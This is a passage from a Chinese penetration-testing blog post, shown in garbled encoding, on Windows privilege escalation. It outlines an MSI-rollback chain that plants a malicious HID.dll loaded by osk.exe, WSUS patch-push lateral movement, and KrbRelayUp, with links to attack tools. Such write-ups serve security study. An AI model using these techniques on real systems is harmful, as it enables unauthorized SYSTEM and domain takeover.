<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Windows Installer åˆ›å»ºå—ä¿æŠ¤çš„ C:\Config.Msi æ–‡ä»¶å¤¹åç«‹å³å°†å…¶åˆ é™¤
 é‡æ–°åˆ›å»ºå…·æœ‰å¼± DACL æƒé™çš„ C:\Config.Msi æ–‡ä»¶å¤¹ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·å¯ä»¥åœ¨ C:\ æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ã€‚
 å°†æ¶æ„ .rbs å’Œ .rbf æ–‡ä»¶æ”¾å…¥å…¶ä¸­ï¼Œä»¥ä¾¿ç”± MSI å›æ»šæ‰§è¡Œ
 ç„¶ååœ¨å›æ»šæ—¶ï¼ŒWindows Installer å°†å¯¹ç³»ç»Ÿè¿›è¡Œä»»æ„æ›´æ”¹
</code></pre></div></div>

<p>è§¦å‘æ­¤é“¾çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ zdi/FilesystemEoPs/FolderOrFileDeleteToSystemã€‚  è¯¥æ¼æ´åˆ©ç”¨åŒ…å«ä¸€ä¸ªå…·æœ‰ 2 ä¸ªæ“ä½œçš„ .msi æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ“ä½œä¼šäº§ç”Ÿå»¶è¿Ÿï¼Œç¬¬äºŒä¸ªæ“ä½œä¼šå¼•å‘é”™è¯¯ä»¥ä½¿å…¶å›æ»šã€‚  æ­¤å›æ»šå°†â€œæ¢å¤â€C:\Program Files\Common Files\microsoft shared\ink\HID.dll ä¸­çš„æ¶æ„ HID.dllã€‚</p>

<p>ç„¶åä½¿ç”¨ [CTRL]+[ALT]+[DELETE] åˆ‡æ¢åˆ°å®‰å…¨æ¡Œé¢å¹¶æ‰“å¼€å±å¹•é”®ç›˜ (osk.exe)ã€‚  osk.exeè¿›ç¨‹é¦–å…ˆæŸ¥æ‰¾C:\Program Files\Common Files\microsoftå…±äº«\ink\HID.dllåº“è€Œä¸æ˜¯C:\Windows\System32\HID.dll</p>

<h1 id="windows-åŸŸå†…ææƒ">Windows åŸŸå†…ææƒ</h1>
<h2 id="wsus">WSUS</h2>
<p>WSUS æ˜¯å¾®è½¯æ¨å‡ºçš„å…è´¹çš„ Windows æ›´æ–°ç®¡ç†æœåŠ¡ï¼Œå½“æˆ‘ä»¬è·å¾—äº†WSUSæœåŠ¡å™¨çš„æ§åˆ¶æƒé™åï¼Œå¯ä»¥é€šè¿‡æ¨é€è¡¥ä¸çš„æ–¹å¼è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚è¿™ä¸ªåˆ©ç”¨æ–¹æ³•æœ€æ—©å…¬å¼€åœ¨BlackHat USA 2015ã€‚</p>

<p>åˆ©ç”¨å·¥å…·</p>
<ul>
  <li>https://github.com/nettitude/SharpWSUS</li>
  <li>https://github.com/AlsidOfficial/WSUSpendu</li>
  <li>https://github.com/ThunderGunExpress/Thunder_Woosus</li>
</ul>

<p>ä»¥ä¸Šä¸‰ä¸ªå·¥å…·çš„å®ç°åŸç†åŸºæœ¬ç›¸åŒï¼Œéƒ½æ˜¯åˆ›å»ºä¸€ä¸ªè°ƒç”¨psexecæ‰§è¡Œå‘½ä»¤çš„è¡¥ä¸ï¼Œå°†è¡¥ä¸æ¨é€è‡³æŒ‡å®šè®¡ç®—æœºï¼Œç­‰å¾…ç›®æ ‡è®¡ç®—æœºæ›´æ–°è¡¥ä¸</p>

<ul>
  <li><a href="https://www.4hou.com/shop/posts/nJAP">å˜¶è´§</a></li>
</ul>

<h2 id="krbrelayup">KrbRelayUp</h2>
<p>CVE-2022â€“26923 åŸŸå†…ææƒæ¼æ´ã€‚</p>

<p>è¿™æœ¬è´¨ä¸Šæ˜¯åœ¨ä¸å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åï¼ˆé»˜è®¤è®¾ç½®ï¼‰çš„ Windows åŸŸç¯å¢ƒä¸­çš„é€šç”¨æ— ä¿®å¤æœ¬åœ°æƒé™å‡çº§ã€‚</p>

<p>è¿™æ„å‘³ç€æ¯å°åŸŸå†… Windows ä¸»æœºéƒ½åªè¦æœªæ›´æ”¹é»˜è®¤è®¾ç½®å¹¶å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åè®¾ç½®ï¼Œå°±å®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€é…·çš„æ˜¯ï¼Œä¸éœ€è¦æ‹¥æœ‰ç‰¹æ®Šæƒé™æˆ–æˆä¸ºç®¡ç†å‘˜ã€‚</p>

<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials</td>
          <td>Icyguiderâ€™s Blog](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[From unprivileged user to system - KrbRelayUp</td>
          <td>wwwGeneral](https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master Â· swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">æ‰‹æŠŠæ‰‹æ•™ä½ Windowsææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master Â· alphaSeclab/windows-security</a></li>
</ul>
</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-11-20T13:34:21+08:00"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div><div class="article__license"><div class="license">
    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
      </a>
    </p>
  </div></div></footer>
<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html">Windows ææƒï¼ˆä¸‰ï¼‰åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ</a></div><div class="next"><span>NEXT</span><a href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html">TPCTF 2023 graphoid writeup</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>Â© DumKiy's blog 2021,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  â¬…, 38  â¬†, 39  â¡, 40  â¬‡
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script><script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
    var $canvas = null, $this = null, _ctx = null, _text = '';
    $('.language-chart').each(function(){
      $this = $(this);
      $canvas = $('<canvas></canvas>');
      _text = $this.text();
      $this.text('').append($canvas);
      _ctx = $canvas.get(0).getContext('2d');
      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
    });
  });
</script>
<script type="text/x-mathjax-config">
	var _config = { tex2jax: {
		inlineMath: [['$','$'], ['\\(','\\)']]
	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
</script>
<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
    mermaid.initialize({
      startOnLoad: true
    });
    mermaid.init(undefined, '.language-mermaid');
  });
</script>

    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

